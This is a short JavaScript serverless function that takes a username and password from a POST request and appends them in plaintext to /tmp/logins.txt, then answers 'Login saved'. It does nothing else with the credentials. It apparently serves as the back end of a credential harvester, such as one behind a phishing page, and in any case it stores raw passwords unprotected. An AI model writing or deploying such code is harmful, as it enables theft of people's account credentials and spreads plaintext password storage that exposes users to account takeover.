const fs = require("fs");
const path = require("path");

exports.handler = async function(event, context) {
  if (event.httpMethod !== "POST") {
    return { statusCode: 405, body: "Method Not Allowed" };
  }

  const { username, password } = JSON.parse(event.body);
  const logEntry = `Username: ${username}, Password: ${password}\n`;

  const filePath = path.join("/tmp", "logins.txt");
  fs.appendFileSync(filePath, logEntry);

  return {
    statusCode: 200,
    body: JSON.stringify({ message: "Login saved" })
  };
};
